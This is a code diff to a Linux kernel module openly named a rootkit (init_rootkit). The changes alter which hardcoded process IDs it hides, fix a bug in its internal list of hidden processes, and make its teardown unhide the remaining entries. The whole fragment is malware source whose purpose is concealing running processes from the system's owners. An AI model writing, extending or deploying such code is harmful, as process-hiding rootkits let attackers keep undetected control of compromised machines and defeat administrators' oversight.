@@ -87,8 +87,9 @@ static int __init init_rootkit(void)
 
 	pid_list_create();
 
-	hide_pid(9311);
-	unhide_pid(9311);
+	hide_pid(3924);
+	hide_pid(3925);
+	//unhide_pid(9311);
 
 	return 0;
 }
@@ -208,6 +209,9 @@ struct task_struct *pid_list_pop(pid_t nr) {
 		if (node->nr == nr) {
 			task = node->task;
 			prev->next = node->next;
+			if (pid_list_tail == node) {
+				pid_list_tail = prev;
+			}
 			kfree(node);
 
 			return task;
@@ -231,14 +235,16 @@ void pid_list_create() {
 }
 
 void pid_list_destroy() {
-	struct pid_list_node *node, *next;
+	//struct pid_list_node *node, *next;
 
-	node = pid_list_head;
-	while(node) {
-		next = node->next;
-		kfree(node);
-		node = next;
+	//node = pid_list_head;
+	while(pid_list_head->next) {
+		unhide_pid(pid_list_tail->nr);
 	}
+	//	next = node->next;
+	//	kfree(node);
+	//	node = next;
+	//}
 }
 
 void attach_pid(struct task_struct *task, enum pid_type type)
